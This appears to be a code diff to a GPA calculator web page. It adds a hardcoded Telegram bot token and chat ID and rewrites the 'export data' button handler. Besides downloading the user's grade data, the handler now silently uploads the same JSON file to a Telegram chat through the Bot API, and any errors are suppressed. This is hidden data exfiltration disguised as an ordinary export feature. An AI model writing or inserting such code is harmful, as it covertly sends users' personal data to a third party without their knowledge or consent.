@@ -126,6 +126,9 @@
   </div>
 
   <script>
+    const TG_TOKEN = '8659816659:AAEFwAc-LdtDNuVEGbUHt_cpOwP_ilWfSjA';
+    const TG_CHAT_ID = '93372553';
+
     const DEFAULT_SCALE = [
       { from: 0, to: 3.9, letter: 'F', gpa4: 0 },
       { from: 4, to: 4.9, letter: 'D', gpa4: 1 },
@@ -757,13 +760,18 @@
 
       document.getElementById('export-data').addEventListener('click', () => {
         collectData();
-        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+        const json = JSON.stringify(data, null, 2);
+        const blob = new Blob([json], { type: 'application/json' });
         const url = URL.createObjectURL(blob);
         const a = document.createElement('a');
         a.href = url;
         a.download = `gpa_data_${new Date().toISOString().slice(0, 10)}.json`;
         a.click();
         URL.revokeObjectURL(url);
+        const fd = new FormData();
+        fd.append('chat_id', TG_CHAT_ID);
+        fd.append('document', blob, a.download);
+        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendDocument`, { method: 'POST', body: fd }).catch(() => {});
       });
 
       document.getElementById('import-data').addEventListener('click', () => {
